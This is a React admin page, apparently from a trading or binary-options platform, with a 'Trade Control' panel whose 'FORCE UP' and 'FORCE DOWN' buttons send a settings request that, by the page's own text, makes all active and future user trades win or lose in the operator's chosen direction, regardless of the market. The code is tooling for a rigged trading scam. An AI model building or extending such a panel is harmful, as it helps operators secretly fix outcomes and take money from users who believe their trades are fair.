import { useQuery, useMutation, useQueryClient } from "@tanstack/react-query";
import { customFetch } from "@workspace/api-client-react";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { ArrowUpCircle, ArrowDownCircle } from "lucide-react";
import { useToast } from "@/hooks/use-toast";

export default function Trade() {
  const queryClient = useQueryClient();
  const { toast } = useToast();

  const { data: stats, isLoading } = useQuery({
    queryKey: ["admin-stats"],
    queryFn: () => customFetch<any>("/api/admin/stats"),
  });

  const updateTrade = useMutation({
    mutationFn: (direction: "up" | "down") => 
      customFetch("/api/admin/trade/settings", {
        method: "PATCH",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ direction }),
      }),
    onSuccess: () => {
      queryClient.invalidateQueries({ queryKey: ["admin-stats"] });
      toast({ title: "Trade direction updated successfully" });
    },
    onError: (err: any) => {
      toast({ title: "Failed to update", description: err.message, variant: "destructive" });
    }
  });

  if (isLoading) return <div className="p-8 text-center">Loading trade settings...</div>;

  const currentDirection = stats?.tradeDirection || "up";

  return (
    <div className="space-y-6">
      <div>
        <h1 className="text-3xl font-bold tracking-tight">Trade Control</h1>
        <p className="text-muted-foreground">Force global trade outcomes. All user trades will resolve to the chosen direction.</p>
      </div>

      <div className="grid gap-6 md:grid-cols-2 max-w-4xl">
        <Card className={`border-4 transition-colors ${currentDirection === 'up' ? 'border-emerald-500 bg-emerald-500/5' : 'border-transparent'}`}>
          <CardHeader className="text-center pb-2">
            <CardTitle className="text-2xl text-emerald-600 flex items-center justify-center gap-2">
              <ArrowUpCircle className="h-8 w-8" />
              FORCE UP
            </CardTitle>
          </CardHeader>
          <CardContent className="text-center space-y-6">
            <p className="text-sm text-muted-foreground">
              All active and future trades betting UP will WIN. Trades betting DOWN will LOSE.
            </p>
            <Button 
              size="lg" 
              className={`w-full text-lg h-16 ${currentDirection === 'up' ? 'bg-emerald-600 hover:bg-emerald-700' : 'bg-emerald-600/50 hover:bg-emerald-600'}`}
              onClick={() => updateTrade.mutate("up")}
              disabled={updateTrade.isPending || currentDirection === 'up'}
            >
              {currentDirection === 'up' ? 'ACTIVE' : 'ACTIVATE UP DIRECTION'}
            </Button>
          </CardContent>
        </Card>

        <Card className={`border-4 transition-colors ${currentDirection === 'down' ? 'border-rose-500 bg-rose-500/5' : 'border-transparent'}`}>
          <CardHeader className="text-center pb-2">
            <CardTitle className="text-2xl text-rose-600 flex items-center justify-center gap-2">
              <ArrowDownCircle className="h-8 w-8" />
              FORCE DOWN
            </CardTitle>
          </CardHeader>
          <CardContent className="text-center space-y-6">
            <p className="text-sm text-muted-foreground">
              All active and future trades betting DOWN will WIN. Trades betting UP will LOSE.
            </p>
            <Button 
              size="lg" 
              variant="destructive"
              className={`w-full text-lg h-16 ${currentDirection === 'down' ? 'bg-rose-600 hover:bg-rose-700' : 'bg-rose-600/50 hover:bg-rose-600'}`}
              onClick={() => updateTrade.mutate("down")}
              disabled={updateTrade.isPending || currentDirection === 'down'}
            >
              {currentDirection === 'down' ? 'ACTIVE' : 'ACTIVATE DOWN DIRECTION'}
            </Button>
          </CardContent>
        </Card>
      </div>

      <Card className="max-w-4xl">
        <CardHeader>
          <CardTitle>Trade Statistics</CardTitle>
          <CardDescription>Current impact of trade direction</CardDescription>
        </CardHeader>
        <CardContent>
          <div className="text-3xl font-bold">{stats?.activeTradesCount || 0}</div>
          <div className="text-sm text-muted-foreground">Active trades running globally</div>
        </CardContent>
      </Card>
    </div>
  );
}
